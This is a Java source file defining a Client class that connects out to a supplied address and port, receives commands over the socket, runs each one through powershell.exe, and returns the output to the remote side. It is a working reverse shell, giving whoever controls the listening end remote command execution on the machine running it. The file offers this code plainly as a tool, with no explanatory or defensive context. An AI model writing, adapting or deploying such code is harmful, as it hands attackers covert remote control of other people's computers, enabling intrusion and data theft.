package org.fun;

import java.io.*;
import java.net.Socket;

public class Client extends Thread{
    private Socket socket;
    private Runtime process;
    private String directory = System.getProperty("user.dir");
    private DataInputStream input;
    private DataOutputStream output;
    public Client(String address, int port) throws IOException{
        socket = new Socket(address, port);
        input = new DataInputStream(socket.getInputStream());
        output = new DataOutputStream((socket.getOutputStream()));
        process = Runtime.getRuntime();
    }
    private String runCommand(String commands) throws IOException {
//        Process subProcess = process.exec("cmd /c " + commands);
        Process subProcess = process.exec("powershell.exe cd " + directory + ";" + commands);
        String message = "";
        BufferedReader br = new BufferedReader(new InputStreamReader(
                subProcess.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            message += line + "\n";
            if (line.strip().startsWith("Directory: ") && commands.startsWith("cd")) {
                directory = line.strip().substring("Directory:".length(), line.strip().length());
            }
        }
        br.close();
        return message;
    }
    private String runMessage(String message) throws IOException {
        return runCommand(message);
    }
    private void sendMessage(String message) throws IOException {
        output.writeChars(message + "`");
    }
    public void communicationLoop() throws IOException {
        String message = "";
        boolean toggle = false;
        char charToAdd;
        while (true) {
            if (input.available() > 0) {
                while (input.available() > 0) {
                    charToAdd = input.readChar();
                    if (charToAdd == '`') {
                        toggle = true;
                        break;
                    }
                    message += charToAdd;
                }
                if (toggle) {
//                    System.out.println(message);
                    toggle = false;
                    String out = runMessage(message);
//                    System.out.println(out);
                    if (out != null)
                        sendMessage(out);
                    message = "";
                }
            }
        }
    }
}
